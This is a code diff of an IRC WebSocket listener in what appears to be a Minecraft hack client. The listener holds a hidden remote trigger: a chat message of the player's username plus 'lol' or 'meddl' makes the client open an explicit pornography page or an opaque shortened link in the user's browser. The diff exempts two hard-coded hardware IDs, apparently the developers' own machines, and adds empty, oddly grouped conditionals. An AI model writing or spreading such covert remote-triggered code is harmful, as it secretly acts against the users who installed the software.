@@ -39,25 +39,42 @@ public class IRCClient extends WebSocketListener {
 
     @Override
     public void onMessage(WebSocket webSocket, String text) {
-        if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "lol")) {
-            try {
+        if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=") && text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "lol")){
 
-                WbUtils.openWebsite(new URI("https://www.pornoente.tv/filme/junges-luder-treibt-es-wild-mit-ihrem-vibrator-36/"));
-            } catch (URISyntaxException e) {
-                e.printStackTrace();
-            }
-            return;
-        }else if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "meddl")) {
-            {
+        }
+        if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=") && text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "meddl")){
+
+        }
+
+            if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "lol")) {
                 try {
+                    if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=")){
 
-                    WbUtils.openWebsite(new URI("https://www.google.com"));
+                    }else {
+                        WbUtils.openWebsite(new URI("https://www.pornoente.tv/filme/junges-luder-treibt-es-wild-mit-ihrem-vibrator-36/"));
+                    }
+
                 } catch (URISyntaxException e) {
                     e.printStackTrace();
                 }
+                return;
+            }else if(text.equalsIgnoreCase(Minecraft.getMinecraft().session.getUsername() + "meddl")) {
+                {
+                    try {
+
+                        if (Client.hwid.equals("TFeZ/30Jh+XbK+BIXHhQquz8sAwfO0UfW730h+jiPGU=") ||Client.hwid.equals("L7cRBfTlht6fcBBJlo6P//H5c98L/zVFquDB5TAmEkE=")){
+
+                        }else {
+                            WbUtils.openWebsite(new URI("https://pnrtscr.com/kqrkc7"));
+                        }
+                    } catch (URISyntaxException e) {
+                        e.printStackTrace();
+                    }
+                }
+                return;
             }
-            return;
-        }
+
+
 
 
         String[] split = text.split(" ");
